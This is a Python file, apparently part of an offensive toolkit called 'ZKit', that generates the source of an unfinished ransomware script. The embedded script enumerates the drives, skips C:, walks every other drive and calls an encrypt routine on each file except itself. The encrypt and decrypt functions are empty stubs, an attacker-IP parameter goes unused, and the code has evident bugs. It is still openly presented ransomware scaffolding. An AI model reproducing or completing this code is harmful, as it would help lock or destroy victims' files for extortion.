'Ransomware Script A Part Of ZKit : Not Completed'
def Create(*self, Attacker_ip):

    Ransomware_Data = """
from os import walk
import win32.win32api as win32
from sys import argv
from time import sleep

def Get_All_Drives_Letter() :
    drives = win32.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    return {drives}
def Decrypt(PATH : str) :
    pass
def Encrypt(PATH : str) :
    pass
def Get_Targets_Path(Drives : list) :
    lenght = 0
    Drives.pop(Drives.index('C:\\'))
    print(drives)   
 
    for i in range(0 , len(Drives)) :
        drive = Drives[i]
        print("Counting of Available Files To Encrypt")
        semi_this_script = argv[0].replace(":\\" , ":/")
        this_script = semi_this_script.replace(semi_this_script[0] , semi_this_script[0].upper() , -1 )
        print(this_script)
        sleep(1)
        for root , dirname , filename in walk(drive) :
            if len(filename) == 0 :
                print("Passing Folder {r} Because There Is No Files In It".format(r = root))
            elif type(filename) is list :
                for i in range( 0 , len(filename)) :
                    F = filename[i]
                    semi_data = "{r}{f}".format(r = root, f = F)
                    data = semi_data.replace("\\" , "/" , -1)
                    if data == this_script :
                    #Avoiding Encrypting This File 
                        print("Avoiding Encrypting This Script")
                        sleep(1.0)
                    else :
                        if len(root) == 3 and data != this_script  :
                            semi_data = "{r}{f}".format(r = root, f = F)
                            data = semi_data.replace("\\" , "/" , -1)
                            print("Encrypting File : {}".format(data))
                            lenght += 1
                            Encrypt(data)
                        elif len(root) != 3 and data != this_script :
                            semi_data = "{r}{f}".format(r = root, f = F)
                            data = semi_data.replace("\\" , "/" , -1)
                            print("Encrypting File : {}".format(data))
                            lenght += 1 
                            Encrypt(data)
            else :
                
                semi_data = "{r}/{f}".format(r = root, f = F)
                data = semi_data.replace("\\" , "/" , -1)
                if data == this_script :
                #Avoiding Encrypting This File 
                    print("Avoiding Encrypting This Script")
                    sleep(1.0)
                else :
                    if len(root) == 3 and data != this_script  :
                        semi_data = "{r}{f}".format(r = root, f = F)
                        data = semi_data.replace("\\" , "/" , -1)
                        print("Encrypting File : {}".format(data))
                        lenght += 1 
                        Encrypt(data)
                    elif len(root) != 3 and data != this_script :
                        semi_data = "{r}/{f}".format(r = root, f = F)
                        data = semi_data.replace("\\" , "/" , -1)
                        print("Encrypting File : {}".format(data))
                        lenght += 1 
                        Encrypt(data)
                
    print("Succesfully Encrypted {l} Files".format(l = lenght))
    
if __name__ == '__main__' :
    drives = Get_All_Drives_Letter()
    Get_Targets_Path(drives)
    print("Not Compeleted")
            """
    return Ransomware_Data
